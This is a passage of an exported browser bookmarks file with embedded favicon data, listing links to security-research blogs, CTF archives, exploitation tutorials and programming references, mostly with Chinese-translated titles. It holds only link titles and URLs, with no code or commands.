icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAACv0lEQVQ4jQXBbU9TZxgA4Pt+3s5LTykt57SAgAmiOJZlbMuM+sF3hajbD9iy37aQZePTvowsuu2DSpQZwkw0AkYraKVogba8nfb0POd57l0XPm40CUxX2JxQyfN3C3PzrXbDZejlB0ZPT3x752p+/ITVlnc1SHnIrCAgBOCATNP8r/P/PXpULPU5HGduT3uSLfz8y+fnv/m4vd361AwGowt3Z4RBYkQe8ePGXv1drVIZmvzsdLvZWHv1cjgsH2/X78+t9TKjguDc+GhfzhOGAWhbcPz3b7fig/i7W7NhVHy89LCTxNXNqsMFl/Li5Uvnb14PxkZiMIwIHKn0/tFfv/9xe/bO5avXorC83z7kmnJODqVCxx2emixNnWkbbYAxRiCQ/bNw7+NGbXp6Wnn+yPDY5KkzPoiil/O5QqKeNUdZishVxplA1os7L5afFYO+56urcZK0dlsb1U10OQkgmzmABT+HQIDALTEiozyvUCxUq2+MzYhocXFxd6ch+nOHtqspS3pJ3I0JwYA1nIQBq1154ea1Zw8fLPw212p8skaPhf0FFWzutZWBIIy8wXJmrSLUCEwQSotDpXCoHFqd9I7ir7/8arBSOWi1k7gLhobL5fHRMUwztAQMmAToNZpL9/4O+4ul0oDppq9eridZttPcLQRBsdBX39h88uf9PHGOYMEw11MvVlY2VtelI89+MfXDTz+WyuVmfBRVIs+RYEylf2B9aWX16YqvHAJiqbVBPi+VTDMtAtcp5UfOngqikpDSZJkBssYUuPN+7bVOUwBgqc5OTky4Ob/TOQ4Hw66w0fjI7Pd3Pdc3mkAIAyQtuowjIiIyICZ9j3nKlXJrq/Zg+cl+2ql9qFljXcc1jBmGYEF3UjKAxBhaYkqFUWTTTAp5ZebGQfd4+em/9XqdcS49hylHOe7ezl6vlzIU/wOO11ybuVZcUAAAAABJRU5ErkJggg==" target="_blank" rel="noopener">Os博客Osanda | 安全研究与逆向工程</a><br>            <dt><a href="https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf" add_date="1518432343" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAACcUlEQVQ4jTWSPW+TdxTFz733/yS2cWycOChASOSGACGAoEJ9GUrXFjYEYmRoP0AHvke/QVWpc1tVqjpQVYiBgRcJgYBUJE2CYxs7iQkYv8bPc08Hw9l+0hl+0jlSKE4LFKoiIqIAIaJqakFVLQRVE4FaIOlJHEBQAHcCQJzKZI/ML07PzKra22ajXt0c9HsWAjlUVREEAqCTTGUOfHbpyuKZi2OptAhUTVU9STZWnz28+1e/25YoolPyk0XSpw4d+eba9wdyB0c9NftgokEEvW7n9q8/7dS31ILkC1PpbO7qzR8y2byIdDut11vrpIMYS6XnF05nsjkA/V7nt59/7Lx/a+Op9KVvrx86PCciavbPH788vX+nvLZSXl/Z+PcJwbmFJYiohXyh+PLZo5A7OFU6cU7VIAKw/e6NWRSiSFQ88dqrVZIABZgtnSwUZ2zp/Jfzx0+L6pvdxoM7f9YrGxbMQmRmALrt1natnM5kc4Ui6a29puYnp0UVwH6/W/5vxZOYBACIiIi7l9eeN7dr7g4iXyja4vKnM7MlVZ3IT569+FVl42W/11ZVEO5++Ngn1767dXTuOAAAze2adtstfIhYCMcWTn0chqSXTpwJ0ZjTSSfYbu2FRnVTVQEBQGJ/0DcLIgJA1XbrFbpzhCLVzVV9/67ZqL1SFYD1yvpwf6BmGiI1E5HBoLf24nGv0xZgp17ZbVSldHJ5Ijf59eUb9/7+vV7dFBGzIKoQ0D2J4ySJo2h86fwXO/WtvWZDli98Phzuk4zj4UhDVEdKJJMkcXfQR5eJxsZDZmIiiZM4Hrq7ACRJQACCoLuTFEBVzYJF4X/pJi87KkUvgwAAAABJRU5ErkJggg==" target="_blank" rel="noopener">us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent Asynchronous-And-Fileless-Backdoor-wp.pdf</a><br>            <dt><a href="https://hshrzd.wordpress.com/2017/06/05/starting-with-windows-kernel-exploitation-part-2/" add_date="1518588668" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAACpElEQVQ4jU2QPUhbURiGz/m+k4PeqCQ2xCgNqEERIhKCFAQLHRQ6CG4OUrq4dFC0iyCddOtU7OTgHBSdFTIIQvwBRRDpYhQhKCURb+5P7r3n3mPu6WBLfXjG9x3el5bLZSklIYQBVHS9fXHx3dXVPQBD7PL984WFtqUlapoKAACq1SrzPM/zvJeCaZpvKH0Kw2/JpGg0frguU8p2HGpZChEATNME+goEeCbkaxCwmZlf2eyXZrNJKcL/DAAwxhgiEkIQkVDKlfqM+Gljg0j5nZAIISEiQQwBGGOUUnZ3d+c4DqUUCNGDIEnph5aWn4Qwzj8CHAfB7+trMAzW0iKl9DyP7u3tAYBSCgD0ep3a9ttkMqIUBTBd994wYqmUajZrj4/pdNq2bZbJZP6OZkxKGUkkYum0JwRjjFsWVyrT37+7u1ssFufn5/v6+sB/hZRSSfnsus0XHYcjbm1vHx0dDQwMLC8vl8tlYIxF/sEYA8QI5y8yzp+bzffj47qub21tTU1N9fT00OPjY9u2X16q1WptbW3t7e2+7yOi67qGYeRyudvb21KpNDs7axgGLRQKYRgiolLK932lFOccACilQghCSDKZbG1tRUQhhG3bkM1mE4nE/v5+R0fHyMhIKpUaHh4+PT2tVqujo6NdXV3d3d2Xl5eFQiEej8diMZyenl5fX+/s7NzZ2RkaGtI0bXNz0/O8UqkkpRwcHDw8PDw4OJBSnp+f53I5ZlnWzc3Nw8PD09OTZVnRaLRSqVQqFV3X8/l8GIa1Wu3i4kLTtN7eXiEErq6uZjKZk5OTlZWVfD4vhJicnDw7O5uYmJibmzNNc2xszPO8IAjW1tYikQgtFoucc8dxotGo4ziNRiOVSrmuyzkPw1DX9Xg8zhgTQmiaVq/X/wCC1motzBOCuwAAAABJRU5ErkJggg==" target="_blank" rel="noopener">从Windows Kernel Exploitation开始 - 第2部分 - 熟悉HackSys Extreme易受攻击的驱动程序| hasherezade的1001晚上</a><br>            <dt><a href="https://decoder.cloud/2018/02/02/getting-system/amp/?__twitter_impression=true" add_date="1518657438" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACx0lEQVQ4jaWTT0wTURDGv30ta/m7wBIIQbGIYNIiSELAgAcvclJJ6gUiMZwkHsST8Wg84wUSU70RKOvBhIRwEQkJMdioAUTEBrb8McViarpJd0tpu9vueMCt1atzesl7v5lvvnnDgYhDfrzcccE0h0HUw9tYKwDoWXMDHPcOjL3AwPlA/nP2Fzwtj/Gg9X5nidvf66Sox5mMepxJf6+T+p0lbh60jml5LB/hcgp82yuucp6bvVpX/+ZHUpzc1/BJSWUAoF102O80lKG3tlDpWwqHAjGdMHih40+CaXnMJRRcmb1aVz/oj4gW+G8MNQr2p20V8csL33cCqrGM280POEhBNw9a/3rjrDoaiIkAMLGrZoYaBXs+PLGrZpIDTXYASKSNeNXMt0Id3CUG0xz21Be/PVfCi97OanjOlOQgb2c1vJ3V+BxLAwAWfhzn7jz1xW9hmsMMRD0jTaJw7+NP/FvRAtrKTwEAHn9RAABToePSkSZRAFEP422stUVgzRO7ambvSFeu1RblkswcHJ1U+63K8mZyX0OLwJp5G2v9a4yWB1b/bRUnla2k7aLDvnekK/kmMz1rbmyqptwuOuwTu2oGAB66yhUA6K0tVKw2hhoF+5OLIkYDMbFddNg3VVPWs+aGDbfutyTMbNnN06UN84cJs6uqkHWIjqJwMssSGSpaiiRxva4YLqFAqTzFknffR/hH7kr26kDd2lSNVUAKunlJNoLxdLRrPkR3P0QoS0RaSte65kPES7KRJaIsEb0+TFDXfIiC8XSUl2QDUtDNMHA+oJvk7VsKh3zdNYo1snzTngfVnKm+7hqlbykc0k3ynuwF0clvnNpadc3trQXj6aiW0rVncox4STZ4STYsVcF4Ouqa21vD1NZqjssdiDj4tsd5STb6l8OL/khqRUvpmpbSNX8ktdK/HF7kJdmAb3s8n+H+d51/AXgclBDq8lg2AAAAAElFTkSuQmCC" target="_blank" rel="noopener">Getting SYSTEM – Decoder&#39;s Blog</a><br>            <dt><a href="http://www.geekboy.ninja/blog/" add_date="1519121819" target="_blank" rel="noopener">Geekboy | 安全研究员| Bug赏金猎人</a><br>            <dt><a href="https://asciinema.org/" add_date="1491065832" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAABqklEQVQ4jaXTMWtUQRQF4G/ePvNci2ihRUAQsRGJRcRCLBUREbHLfxA78weW2NhILILa+AdSiZEgWFgIUUMIhN0lpjGaRiFW0ZjdZHfHYvYFTCIouc0wd+acOffcO2ap1nna5Ip+TFHxrzFFpU5zmU6DyQVO/Q9RdoIQ2EClyt0q75a4N0MxShdqZH8lWCPG9FLcpB0Zynl4mtkmt/sEvZhIwr4KMmIgRFqRzYgKF3KeN3hR52Kgh7i7rAx6xCJtGpFrbWa6rHdoHeJWxtsGE/MM7SnrDXmduc/EBh9K5iVerhJXUj5+Ii7x5SN39iiQjIROkxvLzB3j5g8WNxgPfN9kK3KywuNlFhtc3yHICFuJYPgoMz1G1hj7ydWcbyHdi/t1Ie97ICaLB9d51uL+AGcHeT3ASItelazN6jYPzvFkdwmxSCTzkckBJg7zKjCynfJbv3i0waUSXJqYlx6003om8r6g2O4fdJiOjJ9nnjSdo3RrSbh8jXg8zUDEkYyij13oUhtmWlKRBWLZxp0S+qPcRahSBL52GFvhcgmuJXBp1Z9x0M/koN/5Nxj4oyI1v/lkAAAAAElFTkSuQmCC" target="_blank" rel="noopener">asciinema - Record and share your terminal sessions, the right way</a><br>            <dt><a href="https://www.trimarcsecurity.com/single-post/2018/05/06/Trimarc-Research-Detecting-Password-Spraying-with-Security-Event-Auditing" add_date="1526391527" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAABsUlEQVQ4jcWTz2sTQRTHPzOzSXaSNlXqQaOoIBLEUiqiiHgQxIuI4EXwJF7EP8M/Qy/iTagHQWmhPXgpKOjNIAoWerBgTA/5YZJNd3f2ech2SUNCe/N7ecPMe5/3i4H/LTXp8gXkPoE5CwmQnAD1JD0rkIMAJeAoUAECoAtowAe2gP6oszcGk1vWLj4qVx4u5PzTBa3mRSkdOWn+iAbNt53G6nLQeS2g9irJKhAwCty74+dfVv2Zx8t/d2i5CAGOaI/bM/PUw37tfn3zkgwDHWlp+2RRQc+F0WKhNPi6G7j3vVZ82c5GvSiMBWkznEWmDPAmtbX2zq9TxvPuFefyF/NWL+StvlMsq2u2ZBLkD2NDzAAP0oe1sFNruFh1k5gE8NF0nZNu4ugnfBtNNt5CIqDWnPvYiKO61QarjZSNUT5a1+NQXjV/r6TJkkmAvaE213ut50ZpXVTaKST2PGO+7PZXPkTBZxnGyGjAPqUrKm2cvLAxQJa24zC5kit0rm9/v9qGTZW5TZdKs5xbr1S3fp5Zip/OHrsL8GzC1qZCUlu9ae2NKe0eGoJM+TOHghxU9j8aJKMmxtqSRQAAAABJRU5ErkJggg==" target="_blank" rel="noopener">Trimarc Research：通过安全事件审计来检测密码喷洒| Trimarc | 保护企业</a><br>            <dt><a href="https://markitzeroday.com/pass-the-hash/crack-map-exec/2018/03/04/da-from-outside-the-domain.html" add_date="1526392438" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAACtklEQVQ4jQXBS2/cRAAA4HnYM36uvc7au91sk+ZRmiZtNk2E4FBxKOqF38OBP1VxKOKCOFAEqoSQKEiRqJQH2W022cS7fqztGdszw/fBg401SN1oOFrO/svzXNOJlEpJCSFshVRCYoSFkhBCCBRQAPuue89Uwlvs9pqyKLNFVZR13ZRFgQDs9UNCCYYoXcRQKCVabADJoJ4VDPubNNox3cCkepnGUb///PBga9A72ns8Wl9fLjNWroiu46FNsWFC4iSLRCMdJ9qSmFDABoNo/NnOF092o66PlOIQmZZJCIXbPq0VVprmeN2iVneV1DENTdnzrVeHj+t8fnbxKez6k/nNZUZXyb229/Xrp0cnIp2tser7n995qAEaOn721IUij+9Aft1pS9h4rz7ff7+w3779AWGl7uc3nu1UvG5YHVnmyXo43t3cjIKOZWztju1gOM9KrrlxUnrmBh4FQK/mTs0sx5NSMM4t17q9PL+4S5OiyrMkZbXj2OfX2Z+nV65FcGfQT0vqmMQzcFvkSEpiUiXEh4tPEBPQ8o/TWcnr65TNkgy2CQ51sIgTCym/Y7KKiVYKKahhHr98Ob2aiaZ54JmOQQyDrgQMox7+7svNFwHpYpkoDAFohcAYYd0ohHqwMfzr9CywjJ1h+OjRQw1pzw72ENg/kk/G0fhkLQhEK2reMMYpJTfTWcWr1998dVk0ccb2R0Pftn7/9Q98lopf/j7/9yY/ndx5FsWqXVUNAHC2SAWU29sPg7D/5qffXMdpJTqfXmOdF/EyTbP89vY+XvGuTYgGlZKT+cL2PNOkYS+oCv7u/Yf5MtEQ0r59sd4AhHVSMn6VFD9+nGIEpFRp3RLX3hgNpBDHJ8+vLiY6xAbVMYKK2iYh2NTk4SiY5Pyf2XLFG79j+57ruE6aJrZt5SVP4kTD+H9n3Wt30DNHnwAAAABJRU5ErkJggg==" target="_blank" rel="noopener">Gaining Domain Admin from Outside Active Directory</a><br>            <dt><a href="https://github.com/Alvin9999/new-pac/wiki/ss%E5%85%8D%E8%B4%B9%E8%B4%A6%E5%8F%B7" add_date="1528849040" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACJElEQVQ4jY1TMWsUQRT+5r3d3Cbe7t3u3hEDdoJgIVieGo1YBixsBIsUtvkHNpaCnaJFUMEihSlEbGxFE8XCRrDWIAqJyd3t3JGcuduZeRa5DUtAk6968/i+733zhlE4hHq9foWZbwG4pkRmAECU2gDw1lr7Qmu9WuarUs2NOH7Onrdw2LQMa8xyO8tuA7BlA07TdM0juvA/cQHj3KdOp3MZgGUAaMTxssc8nxuzOsrzm90s2yDmU6TUtoh0BKhut9t3Rnl+1/O8Mz7z7GSlcnqwt/cKURS1pptNmW42JUmSpfGQKoCp0tBqkTZJkqWCH0VRiyaYFw/uZ+2zcbkDYFAy2AEgAOCcWymaE8yLBOZZALDOjQB0jrGCdevccH9zPEsYPxWU2uz1eutHqbXWP6DUbwCAyAwV0QDUANAxEhBE6uNaSICfAMBK1dI0vX6UOo7jeSaKsD/5F5FSa04EW+22dca8jMPw0r/ESRheZKKnxVlE3lFuzOPRMIeIWN3v93u7ux+IaBBFUasgBkFwlYi2/SD4yEQnSwaPSGv9xa/4T6abzYm6789Vq9WFMAw/K6W2CmKlUtmJoqhRTmNFHmRZ9vXgLyRx/J6IzlnnzotIX2utS/ywkaabTDQFANaY1+0su7G/0TG6WTYHpVaY6LvH/A3ATMngRCE2xtwrxADA5ViDweDNZBDsQamG7/vLw+HwDwDUajVfiZx1wMNOt3u/rPkLJe7aBdfH1TYAAAAASUVORK5CYII=" target="_blank" rel="noopener">ss免费账号 · Alvin9999/new-pac Wiki</a><br>            <dt><a href="http://www.alonemonkey.com/" add_date="1532798769" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAADBklEQVQ4jWWT3U9bdRjHP8/vnPacvtBCAbd0vBTZcCxkIcgcIzobtyy4JcYteuGdwRj/AU32L5j4FxgvudB4Y2aYxGBSpzHZcLgBySaiwBglsELbFXra03N+x4sxRXyS5+L5Pm83ny/8P1QQIIfFfU0d1s1DtQBaBEaHTw9k2tw+gJVCeFFkbgEI9meCgwsAkgUjB97Y2Z7TQ53mZ20h5/WWCGGAYhW34EV+nF3zPp66vTyXBTMHPhDIwYtXRnsHzmaMHwY6ky84jqtLK/cDgObMoESillp4VNy6veJfmPzlz4Xnjw2AC32hM20x/XJ/Z9MnYyP9Q8NDZ+qZTI/pmE3SfKxXRkdGpLu7x42ESa6v5zvELe/1Hwkll7f1upzvZfSVk6nvInZTwjMs/eGVc0EocFXcNqljAWBRY9fxaJhR/cW3P4uBr6rVytOZpZ03VSphjL8xdCoxfnXMjUdjAkq0GeP6xBzLBZflgsv1iXl0KIagJGaH5YO3L7oXz7+aaLb0uPIx0YFwpOM4jifsuCLR1gzT9zYo6YSUdEKm7+WJtmbYaZhSrTVIRS18zyMghJzrNUeHXzp6M5VqT9qW0m9duiSxeJKwHScciQPgOnu4ToWqs8eNqZvBXmVXFXer5bu/Fy4bj4t6zTD8ya3NtVPvX7ucyXSd0FvlupRqARtFR56UHXEaDdyGx7G2lG6KhdTEjelbizvy7p0/KnfNbBYzl9ubf2c49MC27Nds2/K7u5qVEW1F2ckAQNfK+NVtwtrxrbAliYh68P2vxflsFlPlcmhAVjcbuTu/zSplKALX0fXKNrVSnlopT71SIHAdrcwQM7OzanWzkQMkl0Mb+xAZ+ac89Kr544a/O5hOp1UsEg5sAx0SL1DalUqlaExOfWN8PfXTl7eWgk/3QfKfoxwGWoD4YJqPhk+2v3fixa6O9lQLCGxtl1j6a/XxzMMnX93P8zmwCxQB56DrTCDCM8bTRy36WppIByDFChubdRaBPGAAVaBx2JnPbPuPwQL5bx7s/Rt/A/YCROKqJg8zAAAAAElFTkSuQmCC" target="_blank" rel="noopener">AloneMonkey - 猿，改变世界的动物！</a><br>        </dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></p></dl><p><br>        <dt><h3 add_date="1535736301" last_modified="1537107878">博客2</h3><br>        <dl><p><br>            <dt><a href="http://www.geekboy.ninja/blog/" add_date="1519121866" target="_blank" rel="noopener">Geekboy | 安全研究员| Bug赏金猎人</a><br>            <dt><a href="http://captf.com/" add_date="1506524661" target="_blank" rel="noopener">指数 /</a><br>            <dt><a href="https://github.com/ctfs" add_date="1506749317" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACJElEQVQ4jY1TMWsUQRT+5r3d3Cbe7t3u3hEDdoJgIVieGo1YBixsBIsUtvkHNpaCnaJFUMEihSlEbGxFE8XCRrDWIAqJyd3t3JGcuduZeRa5DUtAk6968/i+733zhlE4hHq9foWZbwG4pkRmAECU2gDw1lr7Qmu9WuarUs2NOH7Onrdw2LQMa8xyO8tuA7BlA07TdM0juvA/cQHj3KdOp3MZgGUAaMTxssc8nxuzOsrzm90s2yDmU6TUtoh0BKhut9t3Rnl+1/O8Mz7z7GSlcnqwt/cKURS1pptNmW42JUmSpfGQKoCp0tBqkTZJkqWCH0VRiyaYFw/uZ+2zcbkDYFAy2AEgAOCcWymaE8yLBOZZALDOjQB0jrGCdevccH9zPEsYPxWU2uz1eutHqbXWP6DUbwCAyAwV0QDUANAxEhBE6uNaSICfAMBK1dI0vX6UOo7jeSaKsD/5F5FSa04EW+22dca8jMPw0r/ESRheZKKnxVlE3lFuzOPRMIeIWN3v93u7ux+IaBBFUasgBkFwlYi2/SD4yEQnSwaPSGv9xa/4T6abzYm6789Vq9WFMAw/K6W2CmKlUtmJoqhRTmNFHmRZ9vXgLyRx/J6IzlnnzotIX2utS/ywkaabTDQFANaY1+0su7G/0TG6WTYHpVaY6LvH/A3ATMngRCE2xtwrxADA5ViDweDNZBDsQamG7/vLw+HwDwDUajVfiZx1wMNOt3u/rPkLJe7aBdfH1TYAAAAASUVORK5CYII=" target="_blank" rel="noopener">CTFs</a><br>            <dt><a href="https://msdn.microsoft.com/en-us/library/3bstk3k5.aspx" add_date="1507389962" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAABbUlEQVQ4jaWRPa7aQBSFvxmMpQgkfldC7RUgSkRPywZSQUfNIoAVwB4sQYVoXGQDJn6PB3Gk2MY6qWw9HlWcI11pNLrnu3PPGOAH0KGaPgzwC2hWBPy2QFrRDJDa/zADUAO+A9/G4zHD4ZAwDFksFsxmM/r9PofDAc/zWK1WTCYT0jQlCILC/wfgDdBut5Mknc9n+b6vKIokSdvtVkEQyPd9ZVkmSfI8T4CA9xKwXq8lSfP5XIAGg4HiOJYkjUYjAZpOp5Kk5XJZApxyl1qNPM/ZbDYAnE4nwjAkSRL2+z0Ax+MRgF6vV2ZQhmitJcsykiQBwHVdjDFkWYa1trwDMMa8Aj6DPssY82QAkPQKcBynnFrIdV3q9foTrOgtfcXhdrtxuVzI87ycEkURcRyXzY/Hg+v1yv1+f3rRG6Bms6lOpyNrrQAZY9Rut9VqtYrE5TiOut2uGo3G6zdWrHcLuF+D/Ae5DvATyCoCPv4C7ijFl0YjQwIAAAAASUVORK5CYII=" target="_blank" rel="noopener">C ++语言参考</a><br>            <dt><a href="https://www.codewars.com/?language=cpp" add_date="1507441254" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAC0UlEQVQ4jQXBT2jXdRzH8efr/f38vv5cc/4YY8UYIWOFxBg0JcJGiESH8CAePIR4DI8eQiIkIjp0DokuiYTs0EE8dJDoFCESViNCfg0TEREZteYc8/fn+32/ejz06+sL31jMY3pAAY3AXQBSA8J7AIYpQTE0gsA0BHdLwqKsDZw1aAK5Rqwb3a7C92wvGN6RCKNJoQa7QYxIFougC14GgZSSL0/txNrOVPtGoqXB8/pa56CuV+1gkdS87VPIM0JpOcJQEBOGgdzenNqJtWcHcjWTs4btx8t/7ZXm+axczTmjn/XwQlh/GCYljYpMGLYi2vNN2b8JDYnPhdR0mubmwsbC5w7eBRPhhtG+G5K/MjqqZKIgQvZlu1ooo/HJf7v5bQfNGd8eRD0X4eNSXrF8J5uyq/DLe3udrf0T400H3TBsNw0/IU44fKzuVGm4bmsS5YSUF516QBPHQ3loXzO+/Va/v5vmIalRyHqSB8Y7ku+TzLRqP6jMj4a1qNgYj9hQMEuwbPnMsHQ++33llZlK/CDRDXCvPK+XLF2TtC7rRBtcD3E60r2oqpls6QVxQcQd5PmxxquRpW87QmJLuHfkzt87w+7wojM+DPss0X7Zmo+j5KMIlpL23GCvXJVpwlV3GOMZgqYk1EL1b0cWVzpZnyXaP1vxElm9p/B6PWpiFGVExOEX23b01Pq+Ut5COm0zHTa14e3S7PYl3Qedxzolez2r+GLcqVYtXrPYfHrwYFL5RouOYd4XzhLQs1gclsmT+5rdK8+GvavdyXHA9F7Vbr1p65KsDOd3+Gkv4SPBqgGIewX0GPyoMqtNvLDS3d/chew3w60HVYdXQ3ydzlsZ0/fdbn8asJziH0HXYrMQrgXTzoxEhyQvqY1RKfwi+WfZO4QPZ/73CYI0T2R6KYj00YJ5glmSYivwACstl0BzWGfSzAaet9lGPESeMBqFmUXu/w/JAI7/T3DrbwAAAABJRU5ErkJggg==" target="_blank" rel="noopener">训练与编程挑战/卡塔| Codewars</a><br>            <dt><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/1_basic.html" add_date="1513912049" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAC1UlEQVQ4jXVSv0t0VxA9c+fu+7FvRVxU0IRECEIIErFbwQ+3EEQkiyDbWFoI4n8QSBCClnY2FsFmZUEFUwlW+TClWAQWiwUJIcgaV1DX9za+d++dFN9qSOGBYZhhfh4OLSwsfMXM/4Rh+Aige3h4aPEfuOffcpubm6rRaOSfnp76RCSgSqXSERFnrU2I6E/P835XSv1mrf3l5OTkAQAWFxcHwjD8LsuyGWPMtyLyBTNHAIgqlYoQEYIggLUWSZIgTVP4vv8XEf3onPOI6Ic0TT/zfR9BEEBrjSRJAADaGCN9fX2yu7sL55y0Wi25vLyk8/Pzz+/u7n5WSqFYLKJUKtmJiQk3NjamoihyGxsb6cPDQ14DIBGhgYEBxHEsrVYLKysrWFpasqurq845x1tbWzI6OsqvnFj7iRIiIiUiICLpdrtSq9Xo+flZ9vf3USgUoLUWIqLh4WFqNpuyvb0tp6encM6htxiKiCAipJSiKIpwe3tLURSRtZZE5M3Ozs5oZmYGV1dXuL+/Ry6Xw9sA5xyCIMD09DTq9TpKpRI8z0PvOhhjMDc3h4ODA4yMjGBoaAhZloGI8PoCnHNgZgwODr7FrwjDkPr7+3F9fY2pqSkws3LOgYig3xTDnzRjjPlfMxHJ0dGR1Ot1NTk5ifHxcRhjLDOLiEADEBFBt9uFcw5KKQnDkJRSiplNkiRUq9UwPz+PtbU1ISJ0Oh2ICACI1lpTmqZYX19HPp931lpzcXHBs7OzEBF4nic7Ozvu8fERe3t7rtlscrvd1nEc61wuB6pUKk89QXlExL7vI01TFItFdDqdTESoWCxyq9UiYwyYGURkmDkFYLS19sssywqFQmFIRMbSNP2GmT+02+1Z3/d9IsLNzU3med6vYRh+tNY2APwRx/HfIhIT3sHy8vLXLy8v3xOR53neT8fHx433aqlnqlqtcrlc1u8VlstlXa1WGYB67fsXNjxy8R1L2VcAAAAASUVORK5CYII=" target="_blank" rel="noopener">一、基础知识篇 · CTF All In One</a><br>            <dt><a href="https://vulhub.org/#/index/" add_date="1515131719" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAACm0lEQVQ4jW2STWxMYRiFz/vd7353Zjpmhpn2llLU0DSNnxIEsaEiKqVBiASVkrJQIqHsaEKiXQoJXdqwkjSxkLBoJBZIqEmr6Q+mTTRtymQ6c6edn3u/16KWzuLk5MmzPPS1rQlEDBAAEgAABhGYwbzImZmIFlticYGYoBdy7LkQBrQnlCWURQBABL1og1mCGQBD60IptHlHZNc+M7ws/yuZevd6PjlOAMDC8pOUrDURGZcb1gNg1606fWlV61Vo7TpzS+obyg8ec52Mr2p1oKa2mPqt5x2SEsyShHBzTvmBlopDJyaePEi9f6tLJQIvP3mxuu16KZsWUrktc8nH9+d/jhjKRwNtTWCuvfckNz6cfNhlLAnJYCTW2Ayi/OSP7EiCDGNtxx2hrNGuDmgtoD3h8xvBkDP0Wfj8JOTyE+djjUdj+48E4nVeZq44MzX1/KlVuVLFbHZLUheL/ppaMxQxgmH/qprqy7eEzw/WAMJbdwfrtkz29hiBMmGaKmovTH4XgXhdzbUuZ2zQGUmASMVsFbWz3wac4QEzWq6iFdC6MP3LGR2qbr9ZFq+jdOKTGV46dvcKex57XuXxVrvpVKK9GSQ29fbNvHox/fIZGZKkseHuo2JqVvqr1qQ/9LtOVgZDgXh95dEzJER1eyeIhLLsljPZwc8LyVE3m8kOJ8INO4UzOhjZvteyV5TSf7xcJv2hf6K3W5VXqqg90dsz9/Gd52RK6ZRlV0W27cmNf6OhG+fWdXYLpZyRQWgNgs7nheUDoAt54fODGUIEazfqQv57z236crbRjFbEDrQE1sRBAsxkGNAaAIRg7QEE1vPJsd9v+kp/ZmngwmG4rlfIkxAgwn/DzFoblg9SSmKGaUqlwAz+vw/6d1mw/gsx9TBua8D4PAAAAABJRU5ErkJggg==" target="_blank" rel="noopener">Vulhub - Docker-Compose file for vulnerability environment</a><br>            <dt><a href="https://symeonp.github.io/2017/09/17/fuzzing-winafl.html" add_date="1515159777" target="_blank" rel="noopener">Symeon</a><br>            <dt><a href="https://blog.netspi.com/getting-started-wmi-weaponization-part-1/" add_date="1515163039" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACd0lEQVQ4jW2STUhUcRTFf/f/niNBpZlkieSotYkanx+RtXgMAy0SsY2Yq4hqE1ZoiwgXRYvCTW0SrWjbRlqEaUhY2AQpOOKMRB9QNFFBpOGixI+Z924LZ2xG+u8u59x7z7nnD/958SqnLx503if2hCo2YomqutZE0JlPVIYiALKRMBN0+gXOASh8MrYfrv04+y3brKqPgAJgSdRvyRuQqAxFVMzzvInCtCrDmW2XgU3/IH6ZbDFbVeeGvsyOKwzktH/3jOm4WFY42Fnu96tyFvAyWAqR0wYgHqzr9VVfxoNOn5OMn18bIl89y4S7y9gtxotZGnjdvbMwqspJYElE2mo/zwxZM0HnpsCVjKSDP4p37gB6gKWuXfYfVJ4CmwRKfNHjI0V6rfk3y04yfg/ACLTlW5YWL2DZa5XvbvBcY6nZn8s3YvsRhU/rni2J2CtpV8C9HtjSqyLrN1HVc3d+pt4KNGcjFoDEnlAFaXM7bZke29d961EJDxcqi09dW1l8oGisb271sZ824wI12Yg3xlivYiYzOWd0660LZYE3Wz2iN+ZSo8DenJYP6zGGw2Hb9rwkyPscQgphHGDRsnyFsdyFCGMWgNvU2Kre6tRIkf3u6KpcNR7HgBIRaesqsSawuaviH5rRlTNu2pSD1CsM1CXjneI2NbYiZL+nB3py4Ovy6EogUH1pm0n6AXkBHMjsfFJduLm968uC63xOPAMQ93DjPLA9R9gS6P2MxibgUJ5slRPRyanBbGkjfjtqhlnLO4XSEZ2cHgIINzSU5ikQfRidiD3KPwPgHqmPoGYQ5XR0MjaUSwg3NJRqAWO+yOyridgpwM/F/wJMO/Ws4Cq9JwAAAABJRU5ErkJggg==" target="_blank" rel="noopener">WMI Weaponization入门 - 第1部分</a><br>            <dt><a href="https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/" add_date="1515251940" 